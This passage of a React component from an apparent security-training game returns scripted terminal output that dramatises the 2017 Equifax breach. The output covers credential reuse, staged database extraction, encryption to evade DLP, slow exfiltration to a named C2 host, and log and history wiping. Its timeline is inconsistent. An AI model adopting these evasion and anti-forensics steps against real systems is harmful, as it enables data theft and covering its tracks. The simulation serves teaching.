[!] CRITICAL: No TDE (Transparent Data Encryption) detected!
[!] CRITICAL: Weak database credentials detected (webapp_svc/Eqfx2017Spring!)

[!] SECURITY FAILURES IDENTIFIED:
    ✗ No network segmentation between DMZ and database subnet
    ✗ Databases accessible from compromised web server
    ✗ No data encryption at rest (PII stored in plaintext!)
    ✗ Weak credentials (password in application config file)

[+] Network reconnaissance complete!
[+] MITRE ATT&CK: T1018 - Remote System Discovery
[+] MITRE ATT&CK: T1046 - Network Service Scanning

[*] Key findings:
    - Database cluster: 192.168.100.25-27 (Oracle 11g)
    - 147M consumer records stored UNENCRYPTED
    - Direct network path from web server to databases
    - Credentials found in /var/www/config/database.properties

[*] Next objective: Exfiltrate consumer PII from discovered databases`
      }
    }

    if (objectiveId === 'obj-extract-data') {
      return {
        exploited: true,
        technique: 'T1041',
        message: 'Data exfiltration complete! 147.9 million records stolen.',
        output: `===== EQUIFAX DATA EXFILTRATION OPERATION =====

[!] EXPLANATION: This is the final and most damaging phase - stealing
    147.9 million consumer records from Equifax's databases. We'll extract
    the data, compress it to reduce transfer time, encrypt it to evade
    Data Loss Prevention (DLP) systems, and exfiltrate it over HTTPS
    to blend with legitimate web traffic. The operation runs over 76 days
    undetected due to lack of database activity monitoring.

[*] Target Database: 192.168.100.25 (Oracle 11g)
[*] Estimated Records: 147,900,000
[*] Data Types: SSN, DOB, Names, Addresses, Driver's Licenses, Credit Card Numbers

[!] Why this works: Database has NO encryption at rest, NO activity monitoring,
    and uses weak credentials stored in application config files.

[*] Staging directory: /tmp/.cache/systemd-private
    └─ Using hidden directory name mimicking legitimate system folders

====================================================================
[*] Phase 1: Database Enumeration and Extraction
====================================================================

[*] Step 1.1: Connecting to Oracle database using stolen credentials...
[+] Authentication successful: webapp_svc@192.168.100.25:1521/CONSUMER_DATA
[!] Security Failure: Database accepts connections from compromised web server
    (no network segmentation between DMZ and data tier)

[*] Step 1.2: Enumerating tables and schemas...
[+] Found target table: CONSUMERS (147,900,000 rows)
[+] Columns identified: SSN, FULL_NAME, DOB, ADDRESS, DRIVERS_LICENSE, CC_NUMBER

[*] Step 1.3: Extracting CONSUMERS table in batches (avoiding query timeouts)...
    [+] Batch 1/1479: 100,000 records (6.8 MB) - extracted in 2.3s
    [+] Batch 2/1479: 100,000 records (6.7 MB) - extracted in 2.1s
    [+] Batch 3/1479: 100,000 records (6.9 MB) - extracted in 2.4s
    [...continuing for 76 days...]
[+] Total extracted: 147,900,000 records (~89 GB raw CSV)

====================================================================
[*] Phase 2: Data Compression and Encryption
====================================================================

[*] Step 2.1: Splitting data into manageable chunks for exfiltration...
[+] Created 38 chunks (~2.3 GB each)

[*] Step 2.2: Compressing data chunks with gzip (level 9)...
    [+] Compressed: chunk_aa.gz (523 MB) - 77% reduction
    [+] Compressed: chunk_ab.gz (519 MB) - 78% reduction
    [+] Compressed: chunk_ac.gz (521 MB) - 77% reduction
    [...38 chunks total...]
[+] Total compressed size: 19.2 GB (78% reduction from original 89 GB)

[*] Step 2.3: Encrypting with AES-256-CBC to evade DLP inspection...
[!] EVASION: Encrypted data appears as random bytes to DLP systems,
    preventing pattern matching on SSN/credit card numbers.

[+] Encryption complete: 38 chunks, 19.7 GB total (encrypted overhead)

====================================================================
[*] Phase 3: Exfiltration via HTTPS (Evading DLP)
====================================================================

[*] C2 Server: https://c2.pla-unit54.cn (PLA Unit 54 infrastructure)

[!] EVASION TECHNIQUES:
    ✓ Using HTTPS encryption (DLP cannot inspect without SSL interception)
    ✓ Mimicking legitimate HTTPS sessions (User-Agent: Mozilla/5.0...)
    ✓ Rate limiting to 1 chunk every 2 days (avoiding bandwidth anomaly alerts)
    ✓ Randomized upload times (between 2AM-5AM ET when SOC is understaffed)
    ✓ Using multiple source IPs by rotating through compromised web servers

[*] Beginning slow exfiltration (avoiding network anomaly detection)...
    [+] Day 1: Uploaded chunk_aa (523 MB) - Session: f4a3b2c1... - 2:34 AM ET
    [+] Day 3: Uploaded chunk_ab (519 MB) - Session: 8d7e6f9a... - 3:12 AM ET
    [+] Day 5: Uploaded chunk_ac (521 MB) - Session: 2b1c4a5d... - 2:48 AM ET
    [...continuing over 76 days...]
[+] Day 76: All 38 chunks successfully exfiltrated (19.7 GB total)

[!] Why this went undetected:
    ✗ No outbound traffic monitoring on database servers
    ✗ No SSL/TLS inspection on egress web traffic
    ✗ No baseline for "normal" HTTPS traffic volume
    ✗ SOC analysts missed slow-drip exfiltration pattern

====================================================================
[*] Phase 4: Cleanup and Anti-Forensics
====================================================================

[*] Step 4.1: Securely wiping staging directory...
[+] Overwriting /tmp/.cache/systemd-private with random data (3 passes)
[+] Secure wipe complete - no recoverable artifacts

[*] Step 4.2: Clearing bash history to remove evidence...
[+] Bash history cleared for user 'tomcat'
[+] Removing .bash_history file

[*] Step 4.3: Removing database connection logs...
[+] Cleared Oracle SQL*Net trace files

[+] ==========================================
[+] EXFILTRATION COMPLETE - MISSION SUCCESS
[+] ==========================================

[*] Operation Timeline:
    - March 10, 2017: Initial exfiltration begins
    - May 13, 2017: Breach discovered by Equifax IT
    - July 29, 2017: Final exfiltration completed
    - July 30, 2017: Attackers cease all activity
    - September 7, 2017: Public disclosure (142 days after discovery!)

[*] Final Statistics:
    ✓ Records Stolen: 147.9 million US consumers
    ✓ Data Volume: 19.7 GB (compressed/encrypted)
    ✓ Operation Duration: 76 days undetected
    ✓ Countries Affected: USA, Canada, UK

[+] MITRE ATT&CK Techniques Used:
    - T1005: Data from Local System (database extraction)
    - T1020: Automated Exfiltration (scripted data theft)
    - T1041: Exfiltration Over C2 Channel (HTTPS to C2 server)
    - T1027: Obfuscated Files or Information (AES encryption)
    - T1070: Indicator Removal on Host (log deletion, secure wipe)
    - T1030: Data Transfer Size Limits (chunked exfiltration)
    - T1029: Scheduled Transfer (randomized upload times)

[!] REAL-WORLD IMPACT:
    💰 Financial: $1.4 billion in total costs (settlements, remediation)
    👤 Human: CEO Richard Smith resigned, CIO/CSO also departed
    ⚖️  Legal: 4 PLA Unit 54 officers indicted (Wu Zhiyong, Wang Qian,
              Xu Ke, Liu Lei) - though unlikely to face trial
    🏛️  Regulatory: Congressional hearings, new data security legislation
    📉 Corporate: Stock dropped 31%, reputation permanently damaged
    🌍 Geopolitical: Attributed to Chinese military cyber espionage unit

[*] This became the largest financial data breach in history.`
      }
    }

    // Default fallback
    return {
      exploited: true,
      technique: 'T1059',
      message: 'Exploit executed successfully!',
      output: '[+] Command execution successful\n[+] Objective completed'
    }
  }

  const handleRunCode = async () => {
    console.log('[CodePlayground] handleRunCode started for objective:', objective.id)
    setIsRunning(true)
    setResult(null)

    // Simulate network delay and execution time
    await new Promise(resolve => setTimeout(resolve, 2500))

    // Get simulated output based on objective
    const simulatedResult = getSimulatedOutput(objective.id)
    console.log('[CodePlayground] Simulated result:', simulatedResult)
    setResult(simulatedResult)

    if (simulatedResult.exploited) {
      // Mark as completed - user will manually click "Continue Mission" to close modal
      setIsCompleted(true)
      console.log('[CodePlayground] Exploit successful! User can now click "Continue Mission" button.')
    }

    setIsRunning(false)
  }

  const handleContinue = () => {
    console.log('[CodePlayground] handleContinue called - calling onComplete')
    onComplete()
  }

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex items-start justify-between">
        <div className="flex items-start gap-3">
          <div className="p-2 bg-cyan-500/10 rounded-lg">
            <Code2 className="w-5 h-5 text-cyan-400" />
          </div>
          <div>
            <h3 className="font-semibold text-white">{objective.title}</h3>
            <p className="text-sm text-gray-400 mt-1">{objective.description}</p>
          </div>
        </div>

        {objective.hints && objective.hints.length > 0 && (
          <button
            onClick={() => setShowHint(!showHint)}
            className="px-3 py-1.5 text-sm bg-yellow-500/10 hover:bg-yellow-500/20 text-yellow-400 rounded-lg transition-colors"
          >
            {showHint ? 'Hide' : 'Show'} Hint
          </button>
        )}
      </div>

      {/* Hints */}
      <AnimatePresence>
        {showHint && objective.hints && (
          <motion.div
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: 'auto' }}
            exit={{ opacity: 0, height: 0 }}
            className="bg-yellow-500/5 border border-yellow-500/20 rounded-lg p-4"
          >
            <div className="flex items-start gap-2">
              <Terminal className="w-4 h-4 text-yellow-400 mt-0.5 flex-shrink-0" />
              <div className="space-y-2 flex-1 min-w-0">
                {objective.hints.map((hint, idx) => (
                  <p key={idx} className="text-sm text-yellow-200/80 break-words whitespace-pre-wrap overflow-wrap-anywhere">
                    {hint.text}
                  </p>
                ))}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Code Editor */}
      <div className="border border-gray-700 rounded-lg overflow-hidden">
        <div className="bg-gray-800 px-4 py-2 border-b border-gray-700 flex items-center gap-2">
          <FileCode className="w-4 h-4 text-gray-400" />
          <span className="text-sm text-gray-400">
            {language === 'shell' ? 'exploit.sh' : `exploit.${language}`}
          </span>
        </div>

        <Editor
          height="300px"
          language={language}
          value={code}
          onChange={(value) => setCode(value || '')}
          theme="vs-dark"
          options={{
            minimap: { enabled: false },
            fontSize: 13,
            lineNumbers: 'on',
            scrollBeyondLastLine: false,
            automaticLayout: true,
            tabSize: 2,
            wordWrap: 'on'
          }}
        />
      </div>

      {/* Run Button or Already Completed Badge */}
      <div className="flex items-center gap-3">
        {!isAlreadyCompleted ? (
          <>
            <button
              onClick={handleRunCode}
              disabled={isRunning}
              className="flex items-center gap-2 px-6 py-2.5 bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 disabled:from-gray-600 disabled:to-gray-700 text-white rounded-lg font-medium transition-all shadow-lg shadow-cyan-500/25"
            >
              <Play className={`w-4 h-4 ${isRunning ? 'animate-pulse' : ''}`} />
              {isRunning ? 'Running...' : 'Run Exploit'}
            </button>

            {result && (
              <div className={`flex items-center gap-2 px-4 py-2 rounded-lg ${
                result.exploited
                  ? 'bg-green-500/10 text-green-400'
                  : 'bg-red-500/10 text-red-400'
              }`}>
                {result.exploited ? (
                  <>
                    <CheckCircle className="w-5 h-5" />
                    <span className="font-medium">Success!</span>
                  </>
                ) : (
                  <>
                    <XCircle className="w-5 h-5" />
                    <span className="font-medium">Failed</span>
                  </>
                )}
              </div>
            )}
          </>
        ) : (
          <div className="flex items-center gap-2 px-4 py-2 rounded-lg bg-green-500/10 text-green-400">
            <CheckCircle className="w-5 h-5" />
            <span className="font-medium">✓ Already Completed</span>
          </div>
        )}
      </div>

      {/* Result Output */}
      <AnimatePresence>
        {result && (
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className={`border rounded-lg p-4 ${
              result.exploited
                ? 'bg-green-500/5 border-green-500/20'
                : 'bg-red-500/5 border-red-500/20'
            }`}
          >
            <div className="flex items-start gap-2">
              <Terminal className={`w-4 h-4 mt-0.5 flex-shrink-0 ${
                result.exploited ? 'text-green-400' : 'text-red-400'
              }`} />
              <div className="flex-1 space-y-3 min-w-0">
                <p className={`text-sm font-medium ${
                  result.exploited ? 'text-green-400' : 'text-red-400'
                }`}>
                  {result.message}
                </p>

                {result.output && (
                  <pre className="text-xs text-gray-300 bg-black/30 rounded p-3 overflow-x-auto whitespace-pre-wrap break-words">
                    {result.output}
                  </pre>
                )}

                {result.exploited && result.technique && (
                  <div className="flex items-center gap-2 text-xs text-gray-400">
                    <span className="px-2 py-1 bg-purple-500/20 text-purple-300 rounded font-mono">
                      {result.technique}
                    </span>
                    <span>MITRE ATT&CK technique unlocked</span>
                  </div>
                )}

                {/* Continue Button */}
                {isCompleted && result.exploited && (
                  <motion.div
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ delay: 0.5 }}
                    className="pt-2 border-t border-gray-700"
                  >
                    <button
                      onClick={handleContinue}
                      disabled={isAlreadyCompleted}
                      className="w-full flex items-center justify-center gap-2 px-6 py-3 bg-gradient-to-r from-green-500 to-cyan-500 hover:from-green-600 hover:to-cyan-600 disabled:from-gray-600 disabled:to-gray-700 disabled:cursor-not-allowed text-white rounded-lg font-medium transition-all shadow-lg shadow-green-500/25"
                    >
                      <CheckCircle className="w-5 h-5" />
                      <span>
                        {isAlreadyCompleted
                          ? '✓ Already Completed'
                          : 'Continue Mission'}
                      </span>
                    </button>
                  </motion.div>
                )}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

    </div>
  )
}
